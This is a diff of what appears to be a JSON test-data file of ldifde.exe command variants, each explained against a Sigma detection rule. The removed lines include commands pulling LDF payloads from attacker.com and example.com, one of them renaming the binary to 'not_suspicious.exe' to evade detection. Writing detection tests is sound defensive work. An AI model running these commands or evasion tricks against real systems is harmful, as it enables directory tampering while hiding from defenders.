@@ -1,22 +1,22 @@
 [
   {
-    "output": "ldifde.exe -i -f http://example.com/payload.ldf",
-    "explanation": "This is the original true positive command and matches the Sigma rule exactly."
+    "output": "ldifde.exe -i -f C:\\path\\to\\file.ldf",
+    "explanation": "This command uses the import flag '-i' and the file flag '-f' as specified in the Sigma rule. It is a direct representation of the rule's detection criteria."
   },
   {
-    "output": "ldifde.exe /i /f C:\\path\\to\\file.ldf",
-    "explanation": "This command uses substitution of short/long options (-i to /i) and is still detected by the Sigma rule."
+    "output": "ldifde.exe -i -f\"C:\\path\\to\\file.ldf\"",
+    "explanation": "This command uses quotes around the file path to handle potential spaces in the path. It still includes the '-i' and '-f' flags as required by the Sigma rule."
   },
   {
-    "output": "copy ldifde.exe not_suspicious.exe && not_suspicious.exe /i /f http://attacker.com/payload.ldf",
-    "explanation": "This command renames the executable but still uses the same flags, and is detected by the Sigma rule."
+    "output": "ldifde.exe -i -f C:\\path\\to\\file.ldf ",
+    "explanation": "This command adds an extra space at the end of the command line, which is a safe mutation technique and does not affect the behavior of the command."
   },
   {
-    "output": "ldifde.exe -i -f \"http://attacker.com/payload.ldf\" -u",
-    "explanation": "This command adds an extra flag (-u) but still includes the required -i and -f flags, and is detected by the Sigma rule."
+    "output": "ldifde.exe -i -f C:\\path\\to\\file.ldf -s DC=example,DC=com",
+    "explanation": "This command adds an optional server (-s) parameter, which is not part of the Sigma rule's detection criteria but does not interfere with the rule's detection of '-i' and '-f'."
   },
   {
-    "output": "ldifde.exe /i /f http://attacker.com/payload.ldf",
-    "explanation": "This command uses substitution of short/long options (-i to /i) and is still detected by the Sigma rule."
+    "output": "ldifde.exe -i -f C:\\path\\to\\file.ldf -j C:\\temp\\",
+    "explanation": "This command adds a working directory (-j) parameter, which is optional and does not affect the detection of '-i' and '-f' by the Sigma rule."
   }
 ]
